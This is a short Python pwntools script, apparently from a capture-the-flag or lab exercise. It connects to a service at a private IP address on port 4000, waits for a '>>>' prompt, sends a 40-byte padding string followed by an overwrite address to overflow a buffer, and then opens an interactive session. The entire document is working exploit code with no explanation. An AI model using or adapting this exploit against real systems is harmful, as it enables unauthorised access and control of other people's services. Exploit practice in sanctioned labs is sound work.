import pwn

def exploit():
    conn = pwn.remote("172.19.2.137",4000)
    while conn.can_recv(timeout=1):
        rec = conn.recvline()
        conn.sendlineafter(">>>",'A'*40+'\x88\x77\x66\x55\x44\x33\x22\x11')
        conn.interactive()

exploit()